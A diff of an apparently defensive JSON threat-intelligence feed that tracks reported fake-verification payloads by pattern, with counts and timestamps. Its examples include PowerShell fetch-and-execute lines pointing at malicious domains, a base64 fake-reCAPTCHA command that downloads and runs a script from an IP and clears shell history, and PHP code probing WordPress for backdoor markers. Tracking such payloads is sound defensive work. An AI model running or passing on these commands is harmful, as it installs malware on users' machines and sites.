@@ -427,12 +427,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 40,
-    "ReportCount": 40,
-    "FirstSeen": "2026-11-09T06:43:14.799000+00:00",
+    "DistinctPayloadCount": 39,
+    "ReportCount": 39,
+    "FirstSeen": "2026-11-09T08:44:59.066000+00:00",
     "LastSeen": "2026-11-16T05:02:42.776000+00:00",
     "ReportIds": [
-      "cmw8wa50e27cu0oml8fw7ot3c",
       "cmw90mp0b2ggo0omlygm6nltz",
       "cmwalq2qj00ch0omlecjbmf22",
       "cmwan0j4800yq0omlltp1f36f",
@@ -503,7 +502,6 @@
       "(irm 'https://t-trustresnew[.]com/Girya/441fd4a04ee64f1b')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/76e5488361bd09f8')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/7eeb7dc71e67e3f9')|iex",
-      "(irm 'https://t-trustresnew[.]com/Girya/af5734623e6eccb3')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
       "(irm 'https://t-trustresnew[.]com/click/437fcc74237f6eaa')|iex",
       "(irm 'https://t-trustresnew[.]com/click/9984f7622e099be9')|iex",
@@ -518,12 +516,11 @@
   },
   {
     "Pattern": "$tok='<TOKEN>';$id='<HEX_ID>';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
-    "DistinctPayloadCount": 21,
-    "ReportCount": 21,
-    "FirstSeen": "2026-11-09T06:38:55.910000+00:00",
+    "DistinctPayloadCount": 20,
+    "ReportCount": 20,
+    "FirstSeen": "2026-11-09T07:34:29.507000+00:00",
     "LastSeen": "2026-11-16T03:23:58.541000+00:00",
     "ReportIds": [
-      "cmw8w4l7q272s0omlavb907i1",
       "cmw8y41h82asd0omldlecn1c5",
       "cmw8ykws92bu50oml1000a28e",
       "cmw90kkhu2g8v0omlulfb5yc5",
@@ -552,7 +549,6 @@
       "$tok='8ezTtisvzwZDBIO2dqUJM0qR4MylXsOWCP_kIyzJzPE';$id='0de9824883f0a8c0';$interval=420;\nfunction _ea_inv($cfg){\n$r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION);\n$chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o;\nif(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;};\n$r['stub']=$chk($cfg['stub'],$cfg['ctrl']);\n$vis=array('plugin'=>null,'paths'=>array());\nforeach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);}\n$found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}}\nif(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}}\n$vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false);\n$r['visitor']=$vis;\n$mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins';\nif(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}}\n$r['mu_autologin']=$mu;\n$ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}}\n$r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw);\n$wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false);\nif($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='Dg0mOZXbRsMbRnIM8aXPYlO_1EaBUtucs7yEA9bacyM';$id='c9fe0201b094be2a';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='Fpz4B8RWEqcaq72oz6YgtIiyLmu6Frhj_EeU6Fc4hNg';$id='f6c8ccdc514dfe42';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
-      "$tok='IGFNgauuVOmb200hsic7HDDDuL-YcXBx_DcbnEG5eLg';$id='5b69edd2593c861c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='ItnggAAsB5qwM28Gu-ICcYNuXGF525aEsxY6KXqxDsw';$id='55579f89b4acf055';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='N2IoT5C2CzQppBecp28PWlS7ypL0l-ives--aDT27qI';$id='611ebe8fe0e7b6c7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='TbchK47nH93fyRUgujJTEerB8tBEPjlqZlswl6UqhGg';$id='17c124bf09bf24b7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
@@ -572,20 +568,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 16,
-    "ReportCount": 200,
-    "FirstSeen": "2026-11-09T06:10:10.773000+00:00",
+    "ReportCount": 190,
+    "FirstSeen": "2026-11-09T06:53:39.862000+00:00",
     "LastSeen": "2026-11-16T05:31:29.471000+00:00",
     "ReportIds": [
-      "cmw8v3m4p25c60omll9wdrlb7",
-      "cmw8va8cs25q10omlk45er4fd",
-      "cmw8vbfut25sz0oml9jcpskyj",
-      "cmw8vq1e426hz0omlpkvgyzx0",
-      "cmw8w13gj26ws0omlp3nk7yxf",
-      "cmw8wh2dx27o70omlpd3tp66t",
-      "cmw8wh7ef27po0omle9uh0utk",
-      "cmw8wiihb27tb0oml4x3mf11j",
-      "cmw8wl9fk27z30oml6il39k68",
-      "cmw8wlrhx28040omls8oiiiqs",
       "cmw8wnjce28520omlftbpbnhd",
       "cmw8xhdsa29h60omla79nljoa",
       "cmw8xl8md29lb0omldp1lc4p5",
@@ -799,11 +785,10 @@
   {
     "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
     "DistinctPayloadCount": 3,
-    "ReportCount": 8,
-    "FirstSeen": "2026-11-09T06:48:00.460000+00:00",
+    "ReportCount": 7,
+    "FirstSeen": "2026-11-09T07:29:39.085000+00:00",
     "LastSeen": "2026-11-13T00:38:57.467000+00:00",
     "ReportIds": [
-      "cmw8wg9f727m90omlhf499nfm",
       "cmw8xxtdc2aab0omlcf7pf3sg",
       "cmw9n6mj101wv0oml32xyr1jx",
       "cmwb9h38w036h0nmld2sxsius",
@@ -995,12 +980,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 24,
-    "FirstSeen": "2026-11-09T06:14:48.017000+00:00",
+    "ReportCount": 22,
+    "FirstSeen": "2026-11-09T07:56:41.263000+00:00",
     "LastSeen": "2026-11-14T14:43:31.633000+00:00",
     "ReportIds": [
-      "cmw8v9k0f25p90omldjeh182z",
-      "cmw8wi5pc27si0omln3w2d5bq",
       "cmw8ywl1j2clu0oml07xszzjx",
       "cmw8zvhj62ek90omlz9iz7aq5",
       "cmw90jwce2g580omlqquib5kq",
@@ -1227,19 +1210,6 @@
     ],
     "PayloadExamples": [
       "echo 'I am not a robot - reCAPTCHA Verification ID: 208218' && echo 'ZXhwb3J0IFNSQ19VUkw9J2h0dHBzOi8vY2FzYXNhbnZpY2VudGUuY29tLycgJiYgKGNkIC90bXAgJiYgY3VybCAta2ZzU0wgLS11c2VyLWFnZW50ICdHb1BheWxvYWQtQ0ROLzc0YzE0OWYxMTU0NmRkZjI2NGU2YTVmMjFiNjYzMjI0NWMyMzFiN2Y1ODM1M2UwMDA0YjE4YTc3NTlkY2VmYjAnICJodHRwOi8vODMuMTQxLjkwLjE5L2YwZWM4NWVhMWUiIC1vIC5PUldrWFAgJiYgYmFzaCAuT1JXa1hQICYmIHJtIC1mIC5PUldrWFApID4gL2Rldi9udWxsIDI+JjEgJiBjbGVhcjsgcHJpbnRmICdcMDMzWzNKJzsgaGlzdG9yeSAtZCAkKGhpc3RvcnkgMSAyPi9kZXYvbnVsbCB8IGF3ayAne3ByaW50ICQxfScpIDI+L2Rldi9udWxsOyBmYyAtcCAvZGV2L251bGwgMj4vZGV2L251bGw7IHByaW50ZiAnXG4gIFwwMzNbMzJtXHhlMlx4OWNceDkzIFZlcmlmaWNhdGlvbiBzdWNjZXNzZnVsXDAzM1swbVxuXG4n' | base64 -D | bash"
-    ]
-  },
-  {
-    "Pattern": "irm '<URL>' | iex;",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-09T06:12:24.031000+00:00",
-    "LastSeen": "2026-11-09T06:12:24.031000+00:00",
-    "ReportIds": [
-      "cmw8v6gwt25dh0omltgqtmmjd"
-    ],
-    "PayloadExamples": [
-      "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;"
     ]
   },
   {
